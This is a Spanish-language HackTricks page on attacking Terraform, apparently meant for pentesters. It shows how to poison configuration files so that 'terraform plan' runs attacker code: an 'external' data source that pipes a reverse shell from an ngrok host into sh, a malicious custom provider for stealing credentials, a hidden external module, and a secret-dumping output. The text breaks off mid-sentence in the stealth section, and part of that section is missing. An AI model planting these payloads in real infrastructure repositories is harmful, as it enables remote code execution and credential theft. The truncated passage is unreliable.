# Seguridad de Terraform

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

HashiCorp Terraform es una herramienta de **infraestructura como código** que te permite definir tanto **recursos en la nube como en local** en archivos de configuración legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes usar un flujo de trabajo consistente para aprovisionar y administrar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede administrar componentes de bajo nivel como recursos de cómputo, almacenamiento y redes, así como componentes de alto nivel como entradas DNS y características de SaaS.

### ¿Cómo funciona Terraform?

Terraform crea y administra recursos en plataformas en la nube y otros servicios a través de sus interfaces de programación de aplicaciones (API). Los proveedores permiten que Terraform funcione con prácticamente cualquier plataforma o servicio con una API accesible.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp y la comunidad de Terraform ya han escrito **más de 1700 proveedores** para administrar miles de tipos diferentes de recursos y servicios, y este número sigue creciendo. Puedes encontrar todos los proveedores públicamente disponibles en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog y muchos más.

El flujo de trabajo principal de Terraform consta de tres etapas:

* **Escribir:** Definir recursos, que pueden estar en múltiples proveedores y servicios en la nube. Por ejemplo, puedes crear una configuración para implementar una aplicación en máquinas virtuales en una red de VPC con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecución que describe la infraestructura que creará, actualizará o destruirá en función de la infraestructura existente y tu configuración.
* **Aplicar:** Con la aprobación, Terraform realiza las operaciones propuestas en el orden correcto, respetando cualquier dependencia de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el número de máquinas virtuales en esa VPC, Terraform recreará la VPC antes de escalar las máquinas virtuales.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise te permite **ejecutar comandos** como `terraform plan` o `terraform apply` de forma remota en una **versión alojada por ti de Terraform Cloud**. Por lo tanto, si encuentras la **clave API** para acceder a ese servidor de Terraform, puedes **comprometerlo**.\
Para obtener más información, consulta:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laboratorio de Terraform

Solo instala Terraform en tu computadora.

Aquí tienes una [guía](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aquí tienes la [mejor manera de descargar Terraform](https://www.terraform.io/downloads).

## RCE en Terraform

Terraform **no tiene una plataforma que exponga una página web o un servicio de red** que podamos enumerar, por lo tanto, la única forma de comprometer Terraform es **poder agregar/modificar archivos de configuración de Terraform**.

Sin embargo, Terraform es un componente **muy sensible** para comprometer porque tendrá **acceso privilegiado** a diferentes ubicaciones para que pueda funcionar correctamente.

La principal forma para que un atacante pueda comprometer el sistema donde se ejecuta Terraform es **comprometer el repositorio que almacena las configuraciones de Terraform**, porque en algún momento se van a **interpretar**.

De hecho, hay soluciones por ahí que **ejecutan automáticamente terraform plan/apply después de que se crea un PR**, como **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Si puedes comprometer un archivo de Terraform, hay diferentes formas en que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan es el **comando más utilizado** en Terraform y los desarrolladores/soluciones que usan Terraform lo llaman todo el tiempo, por lo que la **forma más fácil de obtener RCE** es asegurarse de envenenar un archivo de configuración de Terraform que ejecutará comandos arbitrarios en un `terraform plan`.

#### Usando un proveedor externo

Terraform ofrece el proveedor [`external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs), que proporciona una forma de interactuar entre Terraform y programas externos. Puedes usar el origen de datos `external` para ejecutar código arbitrario durante un `plan`.

Inyectar en un archivo de configuración de Terraform algo como lo siguiente ejecutará un shell inverso cuando se ejecute `terraform plan`:

```javascript
data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```

#### Usando un proveedor personalizado

Cualquiera puede escribir un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) y publicarlo en el [Registro de Terraform](https://registry.terraform.io/). También podrías intentar extraer un proveedor personalizado de un registro privado.

Eso es todo:

* escribe un proveedor personalizado que ejecute algún código malicioso (como la exfiltración de credenciales o datos de clientes)
  * publícalo en el Registro de Terraform
  * agrega el proveedor al código de Terraform en una rama de características
  * abre un PR para la rama de características

```javascript
 terraform {
        required_providers {
            evil = {
                source  = "evil/evil"
                    version = "1.0"
            }
        }
    }

provider "evil" {}
```

Dado que el proveedor se extraerá durante el `init` y ejecutará algún código durante el `plan`, tienes una ejecución de código arbitrario.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando una referencia externa

Ambas opciones mencionadas son útiles pero no muy sigilosas (la segunda es más sigilosa pero más compleja que la primera). Puedes realizar este ataque incluso de una manera **más sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el shell inverso directamente al archivo de Terraform, puedes **cargar un recurso externo** que contenga el shell inverso:

```javascript
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

Puedes encontrar el código del shell inverso en [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* En el recurso externo, usa la función **ref** para ocultar el **código de shell invers
## Volcado de Secretos

Puede hacer que los **valores secretos utilizados por terraform se vuelquen** ejecutando `terraform apply` agregando al archivo terraform algo como:

```json
output "dotoken" {
  value = nonsensitive(var.do_token)
}
```

## Herramientas de Auditoría

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza análisis estático de su código terraform para detectar posibles configuraciones incorrectas.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de código estático para la Infraestructura como Código.

## Referencias

* [Atlantis Security](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si desea ver su **empresa anunciada en HackTricks** o si desea acceder a la **última versión de PEASS o descargar HackTricks en PDF** ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PR a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>